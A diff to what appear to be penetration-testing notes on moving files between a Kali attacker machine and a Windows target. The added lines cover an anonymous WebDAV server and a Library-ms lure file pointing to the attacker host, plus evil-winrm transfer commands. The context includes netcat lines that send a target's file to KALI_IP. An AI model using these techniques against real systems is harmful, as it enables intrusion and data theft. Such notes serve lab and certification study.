@@ -31,6 +31,36 @@ client (windows)
 net use m: \\KALI_IP\test /user:kourosh kourosh
 ```
 
+## webdav
+server(kali)
+```
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root `pwd`
+```
+
+client(windows)
+execute config.Library-ms
+```Library-ms
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.x.x</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
 # Netcat
 ### kali -> windows
 listener (linux)
@@ -52,4 +82,15 @@ nc -nvlp 9999 > file.txt
 client (windows)
 ```
 nc.exe -nv KALI_IP 9999 < file.txt
+```
+
+# evil-winrm
+download to current local directory
+```
+download FILEPATH
+```
+
+upload to current remote directory
+```
+upload FILE_PATH
 ```
